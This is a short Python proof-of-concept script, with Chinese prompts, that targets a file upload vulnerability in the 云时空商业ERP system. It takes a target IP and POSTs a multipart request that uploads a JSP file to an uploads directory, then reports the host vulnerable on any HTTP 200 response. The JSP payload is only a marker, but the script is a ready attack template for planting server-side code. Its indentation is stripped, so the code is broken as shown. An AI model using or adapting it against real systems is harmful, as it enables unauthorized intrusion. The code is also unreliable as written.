```
import requests

def verify(ip):

url = f'{ip}/uploads/pics/2023-12-6/test.jsp'

headers = {
'Content-Type': 'multipart/form-data; boundary=4eea98d02AEa93f60ea08dE3C18A1388',
}

payload = '''
--4eea98d02AEa93f60ea08dE3C18A1388
Content-Disposition: form-data; name="file1"; filename="test.jsp"
Content-Type: application/octet-stream

<% out.println("This website has a vulnerability"); %>
--4eea98d02AEa93f60ea08dE3C18A1388--
'''

try:
response = requests.post(url, headers=headers, data=payload)
# 验证成功输出相关信息
if response.status_code == 200 :
print(f"{ip}存在云时空商业ERP文件上传！！！")
else:
print('漏洞不存在。')

except Exception as e:
pass

if __name__ == '__main__':
self = input('请输入目标主机IP地址：')
verify(self)
```

